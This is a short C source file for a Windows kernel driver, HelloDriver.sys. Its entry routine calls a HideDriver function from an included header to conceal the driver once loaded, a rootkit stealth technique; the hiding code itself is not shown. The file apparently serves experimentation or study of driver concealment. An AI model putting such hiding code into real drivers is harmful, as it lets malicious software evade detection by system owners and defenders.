#include <ntifs.h>
#include "HideDriver.h"

#define DRIVER_NAME L"HelloDriver.sys"

NTSTATUS DriverUnload(PDRIVER_OBJECT pDrvObj)
{
	NTSTATUS ntstatus = STATUS_SUCCESS;

	return ntstatus;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pRegPath)
{
	NTSTATUS status = STATUS_SUCCESS;

	pDrvObj->DriverUnload = DriverUnload;

	//HideDriverByName(DRIVER_NAME);
	HideDriver(pDrvObj);

	return status;
}